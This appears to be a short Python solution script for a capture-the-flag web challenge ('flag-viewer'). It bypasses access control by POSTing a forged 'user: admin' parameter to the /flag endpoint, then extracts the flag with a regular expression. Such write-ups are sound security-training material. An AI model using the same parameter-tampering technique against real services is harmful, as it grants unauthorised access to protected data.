'''
flag-viewer.mc.ax
'''

# Solution
# Send a post request to /flag endpoint, pass parameters {user: admin}

import requests
import re

def main():
  resp = requests.post('https://flag-viewer.mc.ax/flag', {'user':'admin'})

  flag_regex = r'hope{.*}'
  flag = re.search(flag_regex, resp.text)[0]
  print(flag)

if __name__ == '__main__':
  main()
